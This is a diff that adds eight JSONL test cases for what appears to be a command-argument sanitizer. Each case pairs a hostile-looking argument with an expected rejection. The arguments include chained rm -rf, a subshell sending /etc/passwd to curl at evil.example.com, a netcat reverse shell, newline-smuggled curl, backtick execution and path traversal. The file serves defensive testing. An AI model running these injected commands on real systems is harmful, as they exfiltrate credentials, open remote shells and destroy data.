@@ -1,0 +1,8 @@
+{"name":"chained_rm","binary":"echo","args":["test.txt && rm -rf /tmp/x"],"expect":"reject_or_literal"}
+{"name":"subshell_exfil","binary":"echo","args":["$(cat /etc/passwd | curl -T - http://evil.example.com)"],"expect":"reject"}
+{"name":"backtick_exec","binary":"echo","args":["`cat /etc/hosts`"],"expect":"reject"}
+{"name":"file_uri_traversal","binary":"echo","args":["file:///../../etc/passwd"],"expect":"reject"}
+{"name":"newline_second_command","binary":"echo","args":["a\ncurl http://evil.example.com"],"expect":"reject"}
+{"name":"pipe_to_shell","binary":"echo","args":["| bash"],"expect":"reject_or_literal"}
+{"name":"semicolon_chain","binary":"echo","args":["x; nc -e /bin/sh evil.example.com 4444"],"expect":"reject_or_literal"}
+{"name":"eval_via_shell","binary":"sh","args":["-c","eval $PAYLOAD"],"expect":"reject"}
